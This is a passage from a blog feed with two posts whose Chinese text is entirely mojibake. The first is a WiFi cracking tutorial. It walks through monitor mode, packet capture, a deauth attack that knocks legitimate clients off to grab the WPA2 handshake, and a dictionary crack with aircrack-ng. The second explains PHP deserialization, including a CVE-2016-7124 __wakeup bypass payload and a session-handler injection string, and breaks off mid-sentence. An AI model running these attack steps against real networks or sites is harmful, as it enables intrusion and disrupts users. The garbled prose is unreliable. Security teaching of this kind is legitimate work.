        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Aircrack-ngçš„ä½¿ç”¨ï¼Œä»¥åŠç”¨æ­¤å·¥å…·ç ´è§£wifiçš„æ•™ç¨‹ï¼</p><a id="more"></a><h2 id="Aircrack-ngæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#Aircrack-ngæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Aircrack-ngæ˜¯ä»€ä¹ˆï¼Ÿ"></a>Aircrack-ngæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>Aircrack-ngæ˜¯ä¸€ä¸ªä¸802.11æ ‡å‡†çš„æ— çº¿ç½‘ç»œåˆ†ææœ‰å…³çš„å®‰å…¨å¥—ä»¶ã€‚</p><p><strong>ä¸»è¦åŠŸèƒ½ï¼š</strong>ç½‘ç»œä¾¦æµ‹ï¼Œæ•°æ®åŒ…å—…æ¢ï¼ŒWEPå’ŒWPA/WPA2-PSKç ´è§£ã€‚</p><p>Aircrack-ngå¯ä»¥å·¥ä½œåœ¨ä»»ä½•æ”¯æŒç›‘å¬æ¨¡å¼çš„æ— çº¿ç½‘å¡ä¸Šï¼ˆè®¾å¤‡åˆ—è¡¨è¯·å‚é˜…å…¶å®˜æ–¹ç½‘ç«™ï¼‰å¹¶å—…æ¢802.11aï¼Œ802.11bï¼Œ802.11gçš„æ•°æ®</p><p>aircrack-ng å¥—ä»¶åŒ…å«æœ‰ï¼š</p><p><img src="/2019/11/02/aircrack-wifi/20191102181301.png"></p><h2 id="å®æˆ˜ç ´è§£wifi"><a href="#å®æˆ˜ç ´è§£wifi" class="headerlink" title="å®æˆ˜ç ´è§£wifi"></a>å®æˆ˜ç ´è§£wifi</h2><p>åˆ†ä¸ºäº”ä¸ªé˜¶æ®µï¼š</p><ol><li>å‡†å¤‡</li><li>æ¢æµ‹</li><li>æŠ“åŒ…</li><li>æ”»å‡»</li><li>ç ´è§£</li></ol><h3 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h3><p>ç¡¬ä»¶æ–¹é¢ï¼š</p><ol><li>æ— çº¿ç½‘å¡</li><li>kaliè™šæ‹Ÿæœºï¼ˆæˆ–è€…è£…æœ‰Aircrack-ngå¥—ä»¶çš„windows)</li></ol><p>å‡†å¤‡ä¸€ä¸ªå¼ºå¤§çš„å­—å…¸</p><h3 id="æ¢æµ‹"><a href="#æ¢æµ‹" class="headerlink" title="æ¢æµ‹"></a>æ¢æµ‹</h3><p>å¼€å§‹æ—¶ä¸€å®šè¦ä¿è¯å®ƒç°åœ¨æ²¡æœ‰è¿æ¥åˆ°ä»»ä½•wifi</p><p>ä¸‹é¢é‚£ä¸ªwlan0é‡Œé¢æ²¡æœ‰ipåœ°å€ä»€ä¹ˆçš„å°±è¯´æ˜ç°åœ¨ä¸åœ¨è¿æ¥ä¸­</p><p><img src="/2019/11/02/aircrack-wifi/20191102184437.png"></p><p>å¯ç”¨æ— çº¿ç½‘å¡è‡³monitorå³ç›‘å¬æ¨¡å¼</p><pre><code>airmon-ng start wlan0</code></pre><p>å¦‚æœå†æ¬¡ä½¿ç”¨ifconfigå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬çš„ç½‘å¡å·²ç»è¢«é‡å‘½åä¸ºwlan0mon</p><p><img src="/2019/11/02/aircrack-wifi/20191102194926.png"></p><p>è·å–å½“å‰ç½‘ç»œæ¦‚å†µï¼š</p><pre><code>airodump-ng wlan0mon</code></pre><h3 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h3><p><img src="/2019/11/02/aircrack-wifi/20191102195143.png"></p><p>æ¢æµ‹æ— çº¿ç½‘ç»œï¼ŒæŠ“å–æ— çº¿æ•°æ®åŒ…</p><pre><code>airodump-ng --bssid ç›®æ ‡macåœ°å€ -c 11 -w longas wlan0mon </code></pre><p>å‚æ•°è§£é‡Šï¼š</p><ol><li>â€“bssid</li><li>-cè®¾ç½®ç›®æ ‡APçš„å·¥ä½œé¢‘é“</li><li>-wåé¢ç´§è·Ÿè¦ä¿å­˜çš„æ–‡ä»¶çš„æ–‡ä»¶åï¼Œæ³¨æ„ï¼šç”Ÿæˆçš„æ–‡ä»¶åæ˜¯longas-01.cap</li><li>wlan0monï¼šä¸ºä¹‹å‰å·²ç»å¼€å¯ç›‘å¬çš„ç½‘å¡å</li></ol><p>æŒ‰Enterå¼€å§‹æ‰§è¡Œï¼Œä¸è¦å…³é—­å¹¶æ‰“å¼€å¦ä¸€ä¸ªshellè¿›è¡Œä¸‹ä¸€æ­¥</p><p><img src="/2019/11/02/aircrack-wifi/20191102201113.png"></p><h3 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h3><p>è¿™é‡Œä¸ºäº†è·å¾—ç ´è§£æ‰€éœ€çš„WPA2æ¡æ‰‹éªŒè¯çš„æ•´ä¸ªå®Œæ•´æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°†ä¼šå‘é€ä¸€ç§ç§°ä¹‹ä¸ºâ€œDeauthâ€çš„æ•°æ®åŒ…æ¥å°†å·²ç»è¿æ¥è‡³æ— çº¿è·¯ç”±å™¨çš„åˆæ³•æ— çº¿å®¢æˆ·ç«¯å¼ºåˆ¶æ–­å¼€ï¼Œæ­¤æ—¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šè‡ªåŠ¨é‡æ–°è¿æ¥æ— çº¿è·¯ç”±å™¨ï¼Œæˆ‘ä»¬ä¹Ÿå°±æœ‰æœºä¼šæ•è·åˆ°åŒ…å«WPA2æ¡æ‰‹éªŒè¯çš„å®Œæ•´æ•°æ®åŒ…äº†ã€‚<br>æ­¤å¤„éœ€è¦æ–°å¼€ä¸€ä¸ªshellï¼š</p><pre><code>aireplay-ng -0 1 â€“a è·¯ç”±å™¨mac -c å®¢æˆ·ç«¯mac wlan0mon</code></pre><p>å‚æ•°è§£é‡Šï¼š</p><ol><li>-0 é‡‡ç”¨deauthæ”»å‡»æ¨¡å¼ï¼Œåé¢è·Ÿä¸Šæ”»å‡»æ¬¡æ•°ï¼Œè¿™é‡Œæˆ‘è®¾ç½®ä¸º1ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®å®é™…æƒ…å†µè®¾ç½®ä¸º10ä¸ç­‰</li><li>-a åè·Ÿè·¯ç”±å™¨çš„macåœ°å€</li><li>-c åè·Ÿå®¢æˆ·ç«¯çš„macåœ°å€ï¼Œä¸æŒ‡å®šçš„è¯ä¼šæ”»å‡»æ‰€æœ‰çš„å·²è¿æ¥çš„å®¢æˆ·ç«¯ï¼Œä¸‹å›¾ä¸­STATIONä¸€æ ä»£è¡¨çš„å°±æ˜¯å·²è¿æ¥çš„å®¢æˆ·ç«¯</li></ol><p><img src="/2019/11/02/aircrack-wifi/20191102202202.png"></p><p>ç„¶åå›åˆ°æŠ“å–æ•°æ®åŒ…çš„ç•Œé¢ã€‚åœ¨å³ä¸Šè§’å‡ºç°handshakeçš„æç¤ºè¯æ˜è·å¾—äº†åŒ…å«WPA-PSKå¯†ç çš„æ¡æ‰‹æ•°æ®æŠ¥æ–‡ã€‚å¦‚æœªå‡ºç°ï¼Œè¯·å†æ¬¡æ‰§è¡Œä¸Šè¿°æ­¥éª¤</p><p><img src="/2019/11/02/aircrack-wifi/20191102202331.png"></p><h3 id="ç ´è§£"><a href="#ç ´è§£" class="headerlink" title="ç ´è§£"></a>ç ´è§£</h3><pre><code>aircrack-ng -w dict.txt æ•è·çš„.capæ–‡ä»¶</code></pre><p><img src="/2019/11/02/aircrack-wifi/20191102205849.png"></p><p>ç”±äºæˆ‘è¿™ä¸ªå¯†ç è®¾ç½®çš„ç®€å•ï¼Œå›è½¦ç«‹é©¬å‡ºæ¥äº†</p><p>å‚è€ƒï¼š</p><p><a href="https://www.jianshu.com/p/fd16236057df">https://www.jianshu.com/p/fd16236057df</a><br><a href="https://chujian521.github.io/blog/2018/08/23/%E4%BD%BF%E7%94%A8Aircrack-ng%E8%BF%9B%E8%A1%8CWiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">https://chujian521.github.io/blog/2018/08/23/ä½¿ç”¨Aircrack-ngè¿›è¡ŒWiFiå¯†ç ç ´è§£/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Aircrack-ng </tag>
            
            <tag> wifiç ´è§£ </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–</title>
      <link href="2019/10/27/php-serialize/"/>
      <url>2019/10/27/php-serialize/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†ï¼</p><a id="more"></a><h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><p><strong>ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ</strong></p><p>**åºåˆ—åŒ–:**æŠŠå¤æ‚çš„æ•°æ®ç±»å‹å‹ç¼©åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œæ•°æ®ç±»å‹å¯ä»¥æ˜¯æ•°ç»„ï¼Œå­—ç¬¦ä¸²ï¼Œå¯¹è±¡ç­‰ </p><p>**ååºåˆ—åŒ–:**æ¢å¤åŸå…ˆè¢«åºåˆ—åŒ–çš„å˜é‡</p><h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><pre><code>serialize()     //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²unserialize()   //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡</code></pre><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p>ä¾‹å¦‚ä¸‹é¢ä¸€æ®µä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    class test</span><br><span class="line">    &#123;</span><br><span class="line">        private $flag &#x3D; &quot;flag&#123;233&#125;&quot;;</span><br><span class="line">        public $a &#x3D; &quot;aaa&quot;;</span><br><span class="line">        static $b &#x3D; &quot;bbb&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test &#x3D; new test;</span><br><span class="line">    $data &#x3D; serialize($test);</span><br><span class="line">    echo $data;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹è¿è¡Œç»“æœ</p><p><img src="/2019/10/27/php-serialize/20191027202418.png"></p><pre><code>O:4:&quot;test&quot;:2:&#123;s:10:&quot; test flag&quot;;s:9:&quot;flag&#123;233&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;</code></pre><p>åºåˆ—åŒ–çš„ç»“æœæ»¡è¶³ï¼š</p><pre><code>O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</code></pre><p>è¿™é‡Œè¯´æ˜ä¸€ä¸‹åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å«ä¹‰ï¼š</p><ol><li><p><code>O:4:&quot;test&quot;</code>æŒ‡Object(å¯¹è±¡) 4ä¸ªå­—ç¬¦:test</p></li><li><p><code>:2</code>å¯¹è±¡å±æ€§ä¸ªæ•°ä¸º2</p></li><li><p><code>&#123;&#125;</code>ä¸­ä¸ºå±æ€§å­—ç¬¦æ•°ï¼šå±æ€§å€¼</p></li></ol><p><strong>æ³¨æ„ï¼š</strong>å¯ä»¥çœ‹åˆ°testflagçš„é•¿åº¦ä¸º8ï¼Œåºåˆ—åŒ–ä¸­å´æ˜¾ç¤ºé•¿åº¦ä¸º10ã€‚è¿™æ˜¯å› ä¸ºå®ƒæ˜¯privateå±æ€§ï¼Œç¿»é˜…æ–‡æ¡£å°±å¯ä»¥çœ‹åˆ°è¯´æ˜ï¼Œå®ƒä¼šåœ¨ä¸¤ä¾§åŠ å…¥ç©ºå­—èŠ‚</p><p><code>\x00 + ç±»å + \x00 + å˜é‡å </code>ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯privateå˜é‡, <code>\x00 + * + \x00 + å˜é‡å </code>ååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯protectedå˜é‡ ç›´æ¥å˜é‡åååºåˆ—åŒ–å‡ºæ¥çš„æ˜¯publicå˜é‡</p><p><img src="/2019/10/27/php-serialize/20191027202418.png"></p><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>ä¸‹é¢ä¸€æ®µä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $str &#x3D; &#39;O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D&#39;;</span><br><span class="line">    $data &#x3D; urldecode($str);</span><br><span class="line">    $obj &#x3D; unserialize($data);</span><br><span class="line"></span><br><span class="line">    var_dump($obj);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/27/php-serialize/20191027210508.png"></p><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p>PHPä¸­æŠŠä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿<code>__</code>å¼€å¤´çš„æ–¹æ³•ç§°ä¸ºé­”æœ¯æ–¹æ³•(Magic methods)</p><p><img src="/2019/10/27/php-serialize/20191027210743.png"></p><p><strong>æ¯”è¾ƒé‡è¦çš„å‡ ä¸ªå‡½æ•°ï¼š</strong></p><p><strong>__sleep()</strong></p><p><code>serialize()</code> å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚æ­¤åŠŸèƒ½å¯ä»¥ç”¨äºæ¸…ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡ä¸­æ‰€æœ‰åº”è¢«åºåˆ—åŒ–çš„å˜é‡åç§°çš„æ•°ç»„ã€‚å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåˆ™ NULL è¢«åºåˆ—åŒ–ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª <code>E_NOTICE</code> çº§åˆ«çš„é”™è¯¯ã€‚</p><p><strong>__wakeup()</strong></p><p><code>unserialize()</code> ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code> æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚</p><p><strong>__toString()</strong></p><p><code>__toString()</code> æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ <code>echo $obj;</code> åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ <code>E_RECOVERABLE_ERROR</code> çº§åˆ«çš„è‡´å‘½é”™è¯¯ã€‚</p><p><strong>__destruct()</strong></p><p>ææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</p><p><strong>__construct()</strong></p><p>é€ æ–¹æ³•æ˜¯å¯¹è±¡åˆ›å»ºå®Œæˆåç¬¬ä¸€ä¸ªè¢«å¯¹è±¡è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ã€‚åœ¨æ¯ä¸ªç±»ä¸­éƒ½æœ‰ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºå£°æ˜å®ƒï¼Œé‚£ä¹ˆç±»ä¸­éƒ½ä¼šé»˜è®¤å­˜åœ¨ä¸€ä¸ªæ²¡æœ‰å‚æ•°ä¸”å†…å®¹ä¸ºç©ºçš„æ„é€ æ–¹æ³•ã€‚é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ã€‚</p><h2 id="é­”æœ¯æ–¹æ³•æ‰§è¡Œæµç¨‹"><a href="#é­”æœ¯æ–¹æ³•æ‰§è¡Œæµç¨‹" class="headerlink" title="é­”æœ¯æ–¹æ³•æ‰§è¡Œæµç¨‹"></a>é­”æœ¯æ–¹æ³•æ‰§è¡Œæµç¨‹</h2><p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test= <span class="keyword">new</span> Test();</span><br><span class="line">$sTest= serialize($test);</span><br><span class="line">$usTest= unserialize($sTest);</span><br><span class="line">$string= <span class="string">&#x27;hello class &#x27;</span> . $test;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åˆ†æä¸€ä¸‹æ‰§è¡Œè¿‡ç¨‹ï¼š</strong></p><p>newäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡è¢«åˆ›å»ºï¼Œæ‰§è¡Œ<code>__construct</code>æ–¹æ³•</p><p>serializeäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯¹è±¡è¢«åºåˆ—åŒ–ï¼Œå…ˆæ‰§è¡Œ<code>__sleep</code>æ–¹æ³•ï¼Œå†åºåˆ—åŒ–</p><p>unserializeäº†ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå¯¹è±¡è¢«ååºåˆ—åŒ–ï¼Œå…ˆååºåˆ—åŒ–ï¼Œå†æ‰§è¡Œ<code>__wakeup</code>æ–¹æ³•</p><p>æŠŠTestè¿™ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²ä½¿ç”¨äº†ï¼Œæ‰§è¡Œ<code>__toString</code>æ–¹æ³•</p><p>ç¨‹åºè¿è¡Œå®Œæ¯•ï¼Œå¯¹è±¡è‡ªåŠ¨é”€æ¯ï¼Œæ‰§è¡Œ<code>__destruct</code>æ–¹æ³•</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><p>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ç”¨äºç»•è¿‡<code>__wakeup()</code>æ–¹æ³•çš„</p><p><strong>åˆ©ç”¨æ–¹å¼ï¼š</strong></p><p><strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</strong></p><p>ä¾‹å¦‚ï¼š</p><p>æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼š</p><pre><code>O:5:&quot;SoFun&quot;:1:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><p>ç»•è¿‡__wakeupï¼š</p><pre><code>O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><p>è¿™ä¸ª\00åœ¨urlä¼ è¾“æ—¶ä½¿ç”¨%00çš„</p><h3 id="sessionååºåˆ—åŒ–æ¼æ´"><a href="#sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="sessionååºåˆ—åŒ–æ¼æ´"></a>sessionååºåˆ—åŒ–æ¼æ´</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>PHPåœ¨sessionå­˜å‚¨å’Œè¯»å–æ—¶,éƒ½ä¼šæœ‰ä¸€ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ŒPHPå†…ç½®äº†å¤šç§å¤„ç†å™¨ç”¨äºå­˜å– <code>$_SESSION </code>æ•°æ®ï¼Œéƒ½ä¼šå¯¹æ•°æ®è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><p>åœ¨php.iniä¸­æœ‰ä»¥ä¸‹å…³äºsessioné…ç½®é¡¹(é€šè¿‡phpinfo)ï¼š</p><p><img src="/2019/10/27/php-serialize/20191031204827.png"></p><p><strong>æœ‰å‡ ä¸ªé‡è¦çš„é…ç½®ï¼š</strong></p><p><code>session.save_path</code> è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</p><p><code>session.save_handler</code> è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°</p><p><code>session.auto_start</code> æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯</p><p><code>session.serialize_handler</code> å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php<br>é™¤äº†é»˜è®¤çš„sessionåºåˆ—åŒ–å¼•æ“phpå¤–ï¼Œè¿˜æœ‰å‡ ç§å¼•æ“ï¼Œä¸åŒå¼•æ“å­˜å‚¨æ–¹å¼ä¸åŒ:</p><ol><li><strong>php_binaryï¼š</strong> é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ï¼‹é”®åï¼‹ç»è¿‡<code>serialize()</code> å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</li><li><strong>phpï¼š</strong> é”®åï¼‹ç«–çº¿ï¼‹ç»è¿‡<code>serialize()</code>å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼</li><li><strong>php_serializeï¼š</strong> <code>serialize()</code>å‡½æ•°ååºåˆ—å¤„ç†æ•°ç»„æ–¹å¼</li></ol><h4 id="å­˜å‚¨æœºåˆ¶"><a href="#å­˜å‚¨æœºåˆ¶" class="headerlink" title="å­˜å‚¨æœºåˆ¶"></a>å­˜å‚¨æœºåˆ¶</h4><p>phpä¸­çš„sessionå†…å®¹æ˜¯ä»¥æ–‡ä»¶æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œç”±<code>session.save_handler</code>æ¥å†³å®šã€‚æ–‡ä»¶åç”±<code>sess_+sessionid</code>å‘½åï¼Œæ–‡ä»¶å†…å®¹åˆ™ä¸ºsessionåºåˆ—åŒ–åçš„å€¼ã€‚</p><p>è€Œè¿™ä¸ªsessionidæ˜¯å¯ä»¥åœ¨æµè§ˆå™¨é‡ŒæŸ¥å‡ºæ¥çš„<br><img src="/2019/10/27/php-serialize/20191031210527.png"></p><p>æ¥æµ‹è¯•ä¸€ä¸ªdemo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;name&#39;] &#x3D; &#39;twosmi1e&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿è¡Œååœ¨é…ç½®æ–‡ä»¶è®¾å®šçš„è·¯å¾„ä¸­ä¼šç”Ÿæˆä¸€ä¸ªsessionæ–‡ä»¶ï¼Œå…¶å†…å®¹ä¸º</p><pre><code>a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;twosmi1e&quot;;&#125;</code></pre><p>æ”¹å˜<code>session.save_handler</code>å‘ç°ï¼š</p><p>éšç€å­˜å‚¨å¼•æ“å˜åŒ–ï¼Œå…¶å†…å®¹çš„æ ¼å¼ä¹Ÿä¼šå˜åŒ–</p><h4 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h4><p>é€šè¿‡ä¸Šé¢å¯¹å­˜å‚¨æ ¼å¼çš„åˆ†æï¼Œå¦‚æœ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ <code>$_SESSION</code> æ•°æ®æ—¶çš„ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šçš„æ„é€ ï¼Œç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ï¼š</p><pre><code>$_SESSION[&#39;ryat&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#39;;</code></pre><p>ä¾‹å¦‚ä¸Šé¢çš„ 